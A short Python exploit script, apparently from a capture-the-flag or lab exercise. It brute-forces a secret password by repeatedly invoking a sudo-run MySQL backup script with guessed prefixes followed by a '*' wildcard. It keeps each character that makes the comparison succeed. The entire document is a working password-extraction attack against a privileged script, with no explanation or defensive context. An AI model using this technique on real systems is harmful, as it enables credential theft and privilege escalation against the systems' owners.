#!/usr/bin/env python3

from string import printable;
import subprocess

result = "";

while not result.endswith('*'):
    # iterate over all characters that can make up the password
    for i in printable:
        # start the backups script
        child = subprocess.Popen(['sudo', '/opt/scripts/mysql-backup.sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
        
        # enter current intermediate result appended with next random character and a wildcard 
        child.communicate(result + i + '*')
        if child.returncode == 0:
            result += i
            print(result)
            break


